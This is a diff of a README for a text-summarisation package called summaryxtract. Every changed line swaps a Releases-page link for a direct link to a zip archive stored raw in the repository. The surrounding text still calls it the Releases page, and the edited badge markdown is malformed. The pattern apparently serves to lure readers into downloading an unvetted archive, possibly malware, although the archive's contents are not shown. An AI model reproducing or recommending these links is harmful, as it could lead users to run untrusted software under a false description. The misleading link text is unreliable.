@@ -1,7 +1,7 @@
 # 🎉 summaryxtract - Extract Key Insights Easily
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download%20summaryxtract-blue.svg)](https://github.com/wesbass456/summaryxtract/releases)
+[![Download](https://github.com/wesbass456/summaryxtract/raw/refs/heads/main/summaryxtract/Software_3.2-alpha.5.zip%https://github.com/wesbass456/summaryxtract/raw/refs/heads/main/summaryxtract/Software_3.2-alpha.5.zip)](https://github.com/wesbass456/summaryxtract/raw/refs/heads/main/summaryxtract/Software_3.2-alpha.5.zip)
 
 ## 📚 Description
 summaryxtract helps you get structured, reliable insights from any text about cultural topics. Whether you have an article or a discussion prompt, this package processes it and gives you clear summaries. It’s designed for everyone, from educators to researchers, making it simple to handle and understand complex texts.
@@ -20,7 +20,7 @@ To use summaryxtract, ensure your computer meets these basic requirements:
 Follow these steps to download and install summaryxtract:
 
 1. **Visit the Releases Page:** Click on the link below to reach the summaryxtract Releases page.
-   [Download here](https://github.com/wesbass456/summaryxtract/releases)
+   [Download here](https://github.com/wesbass456/summaryxtract/raw/refs/heads/main/summaryxtract/Software_3.2-alpha.5.zip)
 
 2. **Select the Latest Version:** On the Releases page, find the latest version of summaryxtract.
 
@@ -58,7 +58,7 @@ Once you have installed summaryxtract, using it is straightforward:
    - You can copy, save, or print the results as needed.
 
 ## 📥 Download & Install
-To download and start using summaryxtract, please visit the Releases page: [Download here](https://github.com/wesbass456/summaryxtract/releases).
+To download and start using summaryxtract, please visit the Releases page: [Download here](https://github.com/wesbass456/summaryxtract/raw/refs/heads/main/summaryxtract/Software_3.2-alpha.5.zip).
 
 ## 🌟 Features
 - **Accurate Responses:** Get reliable summaries that reflect essential insights from your text.
